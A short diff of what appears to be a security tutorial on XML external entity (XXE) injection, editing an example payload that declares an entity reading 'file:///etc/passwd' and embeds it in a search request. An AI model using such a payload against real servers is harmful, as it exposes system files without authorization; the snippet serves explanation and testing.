@@ -17,8 +17,8 @@
   ‘/etc/passwd’ on the server. As in the example below :
   
    ?xml version="1.0" encoding="UTF-8"?>
-   <!DOCTYPE foo [<!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+  !DOCTYPE foo [<!ELEMENT foo ANY >
+   !ENTITY xxe SYSTEM "file:///etc/passwd" >]>
   <search>&xxe;</search> 
 
 3. Send the request to the server by the command:
